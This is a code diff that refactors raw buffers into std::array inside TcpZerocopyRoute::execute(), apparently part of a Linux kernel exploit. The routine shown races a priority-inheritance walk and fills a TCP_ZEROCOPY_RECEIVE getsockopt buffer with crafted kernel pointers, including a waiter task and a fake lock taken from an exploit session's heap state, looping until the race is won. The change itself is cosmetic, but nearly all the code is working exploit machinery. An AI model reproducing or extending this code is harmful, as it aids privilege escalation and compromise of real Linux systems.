@@ -1,4 +1,6 @@
 #include "common.h"
+
+#include <array>
 #include <time.h>
 #include <netinet/in.h>
 #include <netinet/tcp.h>
@@ -270,13 +272,14 @@ RouteStatus TcpZerocopyRoute::execute() noexcept {
     /* custom-write mode: fire the PI walk immediately */
     atomic_store(&race->route_delay_usec, 0);
 
-    char sendbuf[64];
-    memset(sendbuf, 0x33, sizeof(sendbuf));
+    std::array<unsigned char, 64> sendbuf{};
+    sendbuf.fill(0x33);
 
     for (int i = 1; i <= attempts && !route_won; i++) {
         int calls_before = atomic_load(&race->consumer_calls);
         int success_before = atomic_load(&race->consumer_success);
-        (void) send(server_fd.get(), sendbuf, sizeof(sendbuf), MSG_DONTWAIT);
+        (void) send(server_fd.get(), sendbuf.data(), sendbuf.size(),
+                MSG_DONTWAIT);
         while (atomic_load(&punch_phase)) {
             sched_yield();
         }
@@ -294,19 +297,19 @@ RouteStatus TcpZerocopyRoute::execute() noexcept {
             break;
         }
 
-        unsigned char zc[0x40];
-        memset(zc, 0, sizeof(zc));
-        support::put64(zc, 0x18,
+        std::array<unsigned char, 0x40> zc{};
+        support::put64(zc.data(), 0x18,
                 (uint64_t)(uintptr_t)(static_cast<unsigned char *>(
                         mapping.data()) + page_size));
-        support::put32(zc, 0x20, sizeof(sendbuf));
-        support::put64(zc, 0x28, waiter_task);
-        support::put64(zc, 0x30, (g_exploit_session.heap.current.fake_lock));
+        support::put32(zc.data(), 0x20,
+                static_cast<uint32_t>(sendbuf.size()));
+        support::put64(zc.data(), 0x28, waiter_task);
+        support::put64(zc.data(), 0x30, (g_exploit_session.heap.current.fake_lock));
 
-        socklen_t len = sizeof(zc);
+        socklen_t len = static_cast<socklen_t>(zc.size());
         errno = 0;
         int ret = getsockopt(client_fd.get(), IPPROTO_TCP,
-                TCP_ZEROCOPY_RECEIVE, zc,
+                TCP_ZEROCOPY_RECEIVE, zc.data(),
                 &len);
         int saved_errno = errno;
         /* release the consumer only once the zerocopy write landed in the
